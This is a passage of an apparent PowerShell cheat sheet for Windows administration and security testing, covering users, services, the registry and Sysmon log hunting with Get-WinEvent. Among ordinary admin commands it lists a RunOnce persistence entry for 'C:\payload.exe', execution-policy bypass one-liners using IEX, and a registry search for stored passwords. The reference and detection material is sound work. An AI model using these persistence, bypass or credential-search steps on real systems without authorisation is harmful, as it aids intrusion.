adapter</td></tr><tr><td><code>Restart-NetAdapter -Name &#x3C;name></code></td><td>Restart an adapter to apply configuration changes</td></tr><tr><td><code>Test-NetConnection -ComputerName &#x3C;host></code></td><td>Connectivity test; supports <code>-Port</code> for TCP port checks</td></tr></tbody></table>
+<h3 id="user--group-management">User &#x26; Group Management</h3>
+<h4 id="local-users">Local Users</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-LocalUser</code></td><td>List all local user accounts</td></tr><tr><td><code>New-LocalUser -Name &#x3C;name> -NoPassword</code></td><td>Create a local user account with no password</td></tr><tr><td><code>$pw = Read-Host -AsSecureString</code></td><td>Prompt for a password and store it securely (hides input)</td></tr><tr><td><code>Set-LocalUser -Name &#x3C;name> -Password $pw -Description "&#x3C;desc>"</code></td><td>Set a password and description on an existing user</td></tr><tr><td><code>Get-LocalGroup</code></td><td>List all local groups</td></tr><tr><td><code>Get-LocalGroupMember -Name "&#x3C;group>"</code></td><td>Show members of a specific local group</td></tr><tr><td><code>Add-LocalGroupMember -Group "&#x3C;group>" -Member "&#x3C;user>"</code></td><td>Add a user to a local group</td></tr></tbody></table>
+<h4 id="domain-users-requires-rsat-activedirectory-module">Domain Users (requires RSAT ActiveDirectory module)</h4>
+<p>Install RSAT to get the ActiveDirectory PowerShell module:
+<code>Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online</code></p>
+<p>Or install only the AD tools: <code>Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ADUser -Filter *</code></td><td>List all AD users</td></tr><tr><td><code>Get-ADUser -Identity &#x3C;name></code></td><td>Get details for a specific user (by SamAccountName, DN, GUID, or SID)</td></tr><tr><td><code>Get-ADUser -Filter {EmailAddress -like '*domain.corp'}</code></td><td>Filter users by any AD attribute</td></tr><tr><td><code>New-ADUser -Name &#x3C;sam> -Surname &#x3C;last> -GivenName &#x3C;first> -Enabled $true -AccountPassword (Read-Host -AsSecureString "Password")</code></td><td>Create a new AD user</td></tr><tr><td><code>Set-ADUser -Identity &#x3C;name> -Description "&#x3C;text>"</code></td><td>Modify an attribute on an AD user account</td></tr><tr><td><code>Get-ADUser -Identity &#x3C;name> -Properties * | Format-Table</code></td><td>Show all AD attributes for a user</td></tr></tbody></table>
+<h3 id="service-management">Service Management</h3>
+<p>Services are background processes that manage components for the OS and applications. Three categories: Local Services, Network Services, and System Services.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Help *-Service</code></td><td>List all available service-related cmdlets</td></tr><tr><td><code>Get-Service</code></td><td>List all services and their status</td></tr><tr><td><code>Get-Service | ft DisplayName,Status</code></td><td>Display services as a compact table</td></tr><tr><td><code>Get-Service | Where-Object {$_.Status -eq "Running"}</code></td><td>Filter to only running services</td></tr><tr><td><code>Get-Service | Where-Object DisplayName -like '*Defender*' | ft</code></td><td>Search services by display name</td></tr><tr><td><code>Get-Service spooler | Select-Object -Property Name,StartType,Status,DisplayName</code></td><td>Detailed view of a specific service</td></tr><tr><td><code>Start-Service -Name &#x3C;service></code></td><td>Start a service</td></tr><tr><td><code>Stop-Service -Name &#x3C;service></code></td><td>Stop a service</td></tr><tr><td><code>Restart-Service -Name &#x3C;service></code></td><td>Restart a service</td></tr><tr><td><code>Set-Service -Name &#x3C;service> -StartType Disabled</code></td><td>Change a service’s startup type</td></tr><tr><td><code>Remove-Service &#x3C;service></code></td><td>Delete a service (PowerShell 7+ only; use <code>sc.exe delete</code> on older versions)</td></tr></tbody></table>
+<h4 id="remote-service-management">Remote Service Management</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Service -ComputerName &#x3C;hostname></code></td><td>List services on a remote host</td></tr><tr><td><code>Get-Service -ComputerName &#x3C;hostname> | Where-Object {$_.Status -eq "Running"}</code></td><td>Filter remote services to running only</td></tr><tr><td><code>Invoke-Command -ComputerName &#x3C;host1>,&#x3C;host2> -ScriptBlock {Get-Service -Name 'windefend'}</code></td><td>Check a specific service on multiple hosts simultaneously</td></tr></tbody></table>
+<h3 id="scheduled-tasks">Scheduled Tasks</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ScheduledTask</code></td><td>List all scheduled tasks</td></tr><tr><td><code>Get-ScheduledTask | Where-Object {$_.TaskPath -like "\*"}</code></td><td>Filter tasks by path</td></tr><tr><td><code>Get-ScheduledTask -TaskName "&#x3C;name>" | Get-ScheduledTaskInfo</code></td><td>Get last run time and result</td></tr></tbody></table>
+<h3 id="working-with-the-registry">Working with the Registry</h3>
+<p>The Windows Registry is a hierarchical database storing configuration for the OS, hardware, and software. PowerShell can navigate the registry like a file system using the <code>HKLM:</code> and <code>HKCU:</code> PSDrive paths.</p>
+<h4 id="registry-hives">Registry Hives</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Hive</th><th>Abbreviation</th><th>Stores</th></tr></thead><tbody><tr><td><code>HKEY_LOCAL_MACHINE</code></td><td><code>HKLM</code></td><td>Computer-wide hardware, OS, and driver settings</td></tr><tr><td><code>HKEY_CURRENT_USER</code></td><td><code>HKCU</code></td><td>Settings specific to the currently logged-in user</td></tr><tr><td><code>HKEY_CLASSES_ROOT</code></td><td><code>HKCR</code></td><td>File type associations and COM class registrations</td></tr><tr><td><code>HKEY_USERS</code></td><td><code>HKU</code></td><td>Default user profile and all loaded user profiles</td></tr><tr><td><code>HKEY_CURRENT_CONFIG</code></td><td><code>HKCC</code></td><td>Hardware profile variance from the default HKLM config</td></tr></tbody></table>
+<p>Hive files are stored in <code>C:\Windows\System32\Config\</code>. See <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives">https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives</a> for full details.</p>
+<h4 id="reading-the-registry">Reading the Registry</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\&#x3C;key></code></td><td>Read a registry key and list its value names</td></tr><tr><td><code>Get-ItemProperty -Path HKLM:\SOFTWARE\&#x3C;key></code></td><td>Read all values and data under a key (more readable than Get-Item)</td></tr><tr><td><code>Get-ChildItem -Path HKLM:\SOFTWARE\&#x3C;key> -Recurse</code></td><td>Recursively list all subkeys and values under a path</td></tr><tr><td><code>Get-Item -Path HKLM:\...\Run | Select-Object -ExpandProperty Property</code></td><td>List the names of all values in a Run key — good for finding persistence</td></tr></tbody></table>
+<h4 id="searching-the-registry-regexe">Searching the Registry (reg.exe)</h4>
+<p><code>REG QUERY HKCU /F "Password" /t REG_SZ /S /K</code> — search HKCU recursively for key names (<code>/K</code>) containing the word “Password” in string values (<code>/t REG_SZ</code>)</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody><tr><td><code>/F &#x3C;pattern></code></td><td>Pattern to search for</td></tr><tr><td><code>/t &#x3C;type></code></td><td>Value type to search (e.g., <code>REG_SZ</code> for strings)</td></tr><tr><td><code>/S</code></td><td>Search recursively through all subkeys</td></tr><tr><td><code>/K</code></td><td>Search key names only (not value data)</td></tr></tbody></table>
+<h4 id="creating-and-modifying-registry-keys">Creating and Modifying Registry Keys</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>New-Item -Path HKCU:\SOFTWARE\...\RunOnce\ -Name TestKey</code></td><td>Create a new registry key</td></tr><tr><td><code>New-ItemProperty -Path HKCU:\...\TestKey -Name "access" -PropertyType String -Value "C:\payload.exe"</code></td><td>Add a new string value to an existing key</td></tr><tr><td><code>Set-ItemProperty -Path HKCU:\...\TestKey -Name "access" -Value "C:\newpath.exe"</code></td><td>Modify the data of an existing registry value</td></tr><tr><td><code>Remove-ItemProperty -Path HKCU:\...\TestKey -Name "access"</code></td><td>Delete a specific registry value</td></tr></tbody></table>
+<p>reg.exe equivalent for creating a RunOnce value:
+<code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\payload.exe"</code></p>
+<h3 id="execution-policy">Execution Policy</h3>
+<p>Controls whether PowerShell scripts can execute. Commonly bypassed during engagements.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Policy</th><th>Description</th></tr></thead><tbody><tr><td><code>AllSigned</code></td><td>All scripts must be signed by a trusted publisher</td></tr><tr><td><code>Bypass</code></td><td>No restrictions; no warnings</td></tr><tr><td><code>Default</code></td><td><code>Restricted</code> on desktop; <code>RemoteSigned</code> on servers</td></tr><tr><td><code>RemoteSigned</code></td><td>Local scripts run freely; remote scripts must be signed</td></tr><tr><td><code>Restricted</code></td><td>No scripts allowed; individual commands only</td></tr><tr><td><code>Undefined</code></td><td>No policy set; defaults to <code>Restricted</code></td></tr><tr><td><code>Unrestricted</code></td><td>Default for non-Windows; unsigned scripts run with a warning</td></tr></tbody></table>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ExecutionPolicy -List</code></td><td>View policy for all scopes</td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>Bypass for current session only</td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope CurrentUser</code></td><td>Bypass for current user permanently</td></tr></tbody></table>
+<p>Common execution policy bypass one-liners:
+<code>powershell -ExecutionPolicy Bypass -File .\script.ps1</code>
+<code>powershell -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"</code></p>
+<h3 id="windows-event-log--get-winevent">Windows Event Log — Get-WinEvent</h3>
+<p><code>Get-WinEvent</code> queries Windows event logs. Use <code>FilterHashtable</code> for efficient server-side filtering rather than piping everything through <code>Where-Object</code> — FilterHashtable pushes the filter to the log provider, which is significantly faster on large logs. See <a href="/knowledge/Operating-Systems/Windows/Windows-Event-Logs">Windows Event Logs</a> for Event ID reference and log architecture.</p>
+<h4 id="basic-queries">Basic Queries</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Format-Table -AutoSize</code></td><td>List all logs with metadata — log mode (Circular/Retain/AutoBackup), type (Administrative/Analytical/Debug/Operational), and record counts</td></tr><tr><td><code>Get-WinEvent -ListProvider * | Format-Table -AutoSize</code></td><td>Show all registered log providers</td></tr><tr><td><code>Get-WinEvent -ListLog Security</code></td><td>Get configuration details for the Security log</td></tr><tr><td><code>Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize</code></td><td>Retrieve the 5 most recent Security log events with key properties</td></tr><tr><td><code>Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize</code></td><td>Query a non-default log (WinRM operational events)</td></tr><tr><td><code>Get-WinEvent -LogName 'Microsoft-Windows-WinRM/Operational' -Oldest -MaxEvents 30 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize</code></td><td>Retrieve the 30 <strong>oldest</strong> events instead of the most recent</td></tr></tbody></table>
+<h4 id="reading-evtx-files">Reading .evtx Files</h4>
+<p>Query exported or collected <code>.evtx</code> log files — useful for offline forensic analysis and scripted log processing.</p>
+<p><code>Get-WinEvent -Path 'C:\Logs\sample.evtx' -MaxEvents 5 | Select-Object TimeCreated, ID, ProviderName, LevelDisplayName, Message | Format-Table -AutoSize</code></p>
+<h4 id="filterhashtable--efficient-server-side-filtering">FilterHashtable — Efficient Server-Side Filtering</h4>
+<p>FilterHashtable pushes filtering to the event log provider (fast). Supports <code>LogName</code>, <code>Path</code>, <code>ID</code>, <code>Level</code>, <code>StartTime</code>, <code>EndTime</code>, <code>Data</code>, and <code>UserID</code>.</p>
+<pre class="astro-code one-dark-pro" style="background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#7F848E;font-style:italic"># Filter Sysmon for process creation (ID 1) and network connections (ID 3)</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">LogName</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">,</span><span style="color:#D19A66">3</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">  Select-Object</span><span style="color:#ABB2BF"> TimeCreated, ID, ProviderName, LevelDisplayName, Message | </span><span style="color:#56B6C2">Format-Table</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">AutoSize</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Same query against an exported .evtx file</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">Path</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'C:\Logs\sysmon.evtx'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">,</span><span style="color:#D19A66">3</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">  Select-Object</span><span style="color:#ABB2BF"> TimeCreated, ID, ProviderName, LevelDisplayName, Message | </span><span style="color:#56B6C2">Format-Table</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">AutoSize</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Filter by date range (StartTime inclusive, EndTime exclusive)</span></span>
+<span class="line"><span style="color:#E06C75">$startDate</span><span style="color:#56B6C2"> =</span><span style="color:#ABB2BF"> (</span><span style="color:#56B6C2">Get-Date</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Year </span><span style="color:#D19A66">2023</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Month </span><span style="color:#D19A66">5</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Day </span><span style="color:#D19A66">28</span><span style="color:#ABB2BF">).Date</span></span>
+<span class="line"><span style="color:#E06C75">$endDate</span><span style="color:#56B6C2"> =</span><span style="color:#ABB2BF"> (</span><span style="color:#56B6C2">Get-Date</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Year </span><span style="color:#D19A66">2023</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Month </span><span style="color:#D19A66">6</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Day </span><span style="color:#D19A66">3</span><span style="color:#ABB2BF">).Date</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">LogName</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">,</span><span style="color:#D19A66">3</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">StartTime</span><span style="color:#56B6C2">=</span><span style="color:#E06C75">$startDate</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">EndTime</span><span style="color:#56B6C2">=</span><span style="color:#E06C75">$endDate</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">  Select-Object</span><span style="color:#ABB2BF"> TimeCreated, ID, ProviderName, LevelDisplayName, Message | </span><span style="color:#56B6C2">Format-Table</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">AutoSize</span></span></code></pre>
+<h4 id="filterxml--structured-xml-queries">FilterXML — Structured XML Queries</h4>
+<p>FilterXML supports the same query syntax as Event Viewer’s manual XML filter. Useful when FilterHashtable cannot express the condition (e.g., filtering on specific EventData field values).</p>
+<pre class="astro-code one-dark-pro" style="background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#7F848E;font-style:italic"># Detect loading of clr.dll or mscoree.dll (Sysmon Event ID 7 — .NET injection indicator)</span></span>
+<span class="line"><span style="color:#E06C75">$Query</span><span style="color:#56B6C2"> =</span><span style="color:#98C379"> @"</span></span>
+<span class="line"><span style="color:#98C379">&#x3C;QueryList></span></span>
+<span class="line"><span style="color:#98C379">  &#x3C;Query Id="0"></span></span>
+<span class="line"><span style="color:#98C379">    &#x3C;Select Path="Microsoft-Windows-Sysmon/Operational"></span></span>
+<span class="line"><span style="color:#98C379">      *[System[(EventID=7)]] and *[EventData[Data='mscoree.dll']] or *[EventData[Data='clr.dll']]</span></span>
+<span class="line"><span style="color:#98C379">    &#x3C;/Select></span></span>
+<span class="line"><span style="color:#98C379">  &#x3C;/Query></span></span>
+<span class="line"><span style="color:#98C379">&#x3C;/QueryList></span></span>
+<span class="line"><span style="color:#98C379">"@</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterXml </span><span style="color:#E06C75">$Query</span><span style="color:#ABB2BF"> | </span><span style="color:#56B6C2">ForEach-Object</span><span style="color:#ABB2BF"> { </span><span style="color:#56B6C2">Write-Host</span><span style="color:#ABB2BF"> $_</span><span style="color:#E06C75">.Message</span><span style="color:#56B6C2"> `n</span><span style="color:#ABB2BF"> }</span></span></code></pre>
+<h4 id="filterxpath--xpath-based-field-filtering">FilterXPath — XPath-Based Field Filtering</h4>
+<p>FilterXPath allows targeting specific EventData fields by name — more precise than FilterXML for matching named data elements.</p>
+<pre class="astro-code one-dark-pro" style="background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#7F848E;font-style:italic"># Find Sysmon Event ID 1 matching a specific Image and CommandLine (e.g., Sysinternals install)</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">LogName </span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF"> `</span></span>
+<span class="line"><span style="color:#56B6C2">  -</span><span style="color:#ABB2BF">FilterXPath </span><span style="color:#98C379">"*[EventData[Data[@Name='Image']='C:\Windows\System32\reg.exe']] and *[EventData[Data[@Name='CommandLine']='</span><span style="color:#56B6C2">`"</span><span style="color:#98C379">C:\Windows\system32\reg.exe</span><span style="color:#56B6C2">`"</span><span style="color:#98C379"> ADD HKCU\Software\Sysinternals /v EulaAccepted /t REG_DWORD /d 1 /f']]"</span><span style="color:#ABB2BF"> |</span></span>
+<span class="line"><span style="color:#56B6C2">  Select-Object</span><span style="color:#ABB2BF"> TimeCreated, ID, ProviderName, LevelDisplayName, Message | </span><span style="color:#56B6C2">Format-Table</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">AutoSize</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Find Sysmon network connections (ID 3) to a specific destination IP</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">LogName </span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF"> `</span></span>
+<span class="line"><span style="color:#56B6C2">  -</span><span style="color:#ABB2BF">FilterXPath </span><span style="color:#98C379">"*[System[EventID=3] and EventData[Data[@Name='DestinationIp']='&#x3C;destination-ip>']]"</span></span></code></pre>
+<h4 id="parsing-event-xml--extracting-specific-fields">Parsing Event XML — Extracting Specific Fields</h4>
+<p><code>Get-WinEvent</code> events expose full XML via <code>.ToXml()</code>. Parse this to extract specific named data fields into structured PowerShell objects for further filtering and analysis.</p>
+<pre class="astro-code one-dark-pro" style="background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#7F848E;font-style:italic"># Extract SourceIP, DestinationIP, and ProcessGuid from all Sysmon network connection events,</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># then filter for a specific destination IP</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">LogName</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">3</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">ForEach-Object</span><span style="color:#ABB2BF"> {</span></span>
+<span class="line"><span style="color:#E06C75">  $xml</span><span style="color:#56B6C2"> =</span><span style="color:#ABB2BF"> [</span><span style="color:#C678DD">xml</span><span style="color:#ABB2BF">]$_</span><span style="color:#E06C75">.ToXml</span><span style="color:#ABB2BF">()</span></span>
+<span class="line"><span style="color:#E06C75">  $eventData</span><span style="color:#56B6C2"> =</span><span style="color:#E06C75"> $xml.Event.EventData.Data</span></span>
+<span class="line"><span style="color:#56B6C2">  New-Object</span><span style="color:#ABB2BF"> PSObject </span><span style="color:#56B6C2">-</span><span style="color:#ABB2BF">Property </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span></span>
+<span class="line"><span style="color:#E06C75">    SourceIP</span><span style="color:#56B6C2">      =</span><span style="color:#E06C75"> $eventData</span><span style="color:#ABB2BF"> | </span><span style="color:#56B6C2">Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.Name</span><span style="color:#56B6C2"> -eq</span><span style="color:#98C379"> "SourceIp"</span><span style="color:#ABB2BF">}      | </span><span style="color:#56B6C2">Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">ExpandProperty </span><span style="color:#98C379">'#text'</span></span>
+<span class="line"><span style="color:#E06C75">    DestinationIP</span><span style="color:#56B6C2"> =</span><span style="color:#E06C75"> $eventData</span><span style="color:#ABB2BF"> | </span><span style="color:#56B6C2">Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.Name</span><span style="color:#56B6C2"> -eq</span><span style="color:#98C379"> "DestinationIp"</span><span style="color:#ABB2BF">} | </span><span style="color:#56B6C2">Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">ExpandProperty </span><span style="color:#98C379">'#text'</span></span>
+<span class="line"><span style="color:#E06C75">    ProcessGuid</span><span style="color:#56B6C2">   =</span><span style="color:#E06C75"> $eventData</span><span style="color:#ABB2BF"> | </span><span style="color:#56B6C2">Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.Name</span><span style="color:#56B6C2"> -eq</span><span style="color:#98C379"> "ProcessGuid"</span><span style="color:#ABB2BF">}   | </span><span style="color:#56B6C2">Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">ExpandProperty </span><span style="color:#98C379">'#text'</span></span>
+<span class="line"><span style="color:#E06C75">    ProcessId</span><span style="color:#56B6C2">     =</span><span style="color:#E06C75"> $eventData</span><span style="color:#ABB2BF"> | </span><span style="color:#56B6C2">Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.Name</span><span style="color:#56B6C2"> -eq</span><span style="color:#98C379"> "ProcessId"</span><span style="color:#ABB2BF">}     | </span><span style="color:#56B6C2">Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">ExpandProperty </span><span style="color:#98C379">'#text'</span></span>
+<span class="line"><span style="color:#ABB2BF">  }</span></span>
+<span class="line"><span style="color:#ABB2BF">} | </span><span style="color:#56B6C2">Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.DestinationIP</span><span style="color:#56B6C2"> -eq</span><span style="color:#98C379"> "&#x3C;destination-ip>"</span><span style="color:#ABB2BF">}</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># ProcessGuid can be used to pivot back to the originating process (cross-reference Event ID 1)</span></span></code></pre>
+<h4 id="property-based-filtering">Property-Based Filtering</h4>
+<p>Event objects expose data via the <code>.Properties[]</code> array. Each Sysmon event type has a fixed property order — index 21 on Event ID 1 is <code>ParentCommandLine</code>. Useful for quick scripted hunting without XML parsing.</p>
+<pre class="astro-code one-dark-pro" style="background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#7F848E;font-style:italic"># See all available properties for a single event (discovery step)</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">LogName</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">} </span><span style="color:#56B6C2">-</span><span style="color:#ABB2BF">MaxEvents </span><span style="color:#D19A66">1</span><span style="color:#ABB2BF"> |</span></span>
+<span class="line"><span style="color:#56B6C2">  Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Property </span><span style="color:#56B6C2">*</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Find all Sysmon process creation events where the parent used -enc (encoded PowerShell)</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">LogName</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'Microsoft-Windows-Sysmon/Operational'</span><span style="color:#ABB2BF">; </span><span style="color:#E06C75">ID</span><span style="color:#56B6C2">=</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">  Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.Properties</span><span style="color:#ABB2BF">[</span><span style="color:#D19A66">21</span><span style="color:#ABB2BF">].Value </span><span style="color:#56B6C2">-like</span><span style="color:#98C379"> "*-enc*"</span><span style="color:#ABB2BF">} | </span><span style="color:#56B6C2">Format-List</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Properties[21] = ParentCommandLine for Sysmon Event ID 1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic"># Hunt for share creation events across a folder of exported .evtx files</span></span>
+<span class="line"><span style="color:#56B6C2">Get-WinEvent</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">FilterHashtable </span><span style="color:#C678DD">@</span><span style="color:#ABB2BF">{</span><span style="color:#E06C75">Path</span><span style="color:#56B6C2">=</span><span style="color:#98C379">'C:\Logs\LateralMovement\*'</span><span style="color:#ABB2BF">} |</span></span>
+<span class="line"><span style="color:#56B6C2">  Where-Object</span><span style="color:#ABB2BF"> {$_</span><span style="color:#E06C75">.ID</span><span style="color:#56B6C2"> -like</span><span style="color:#98C379"> '5142'</span><span style="color:#ABB2BF">} | </span><span style="color:#56B6C2">Select-Object</span><span style="color:#56B6C2"> -</span><span style="color:#ABB2BF">Property </span><span style="color:#56B6C2">*</span></span></code></pre>
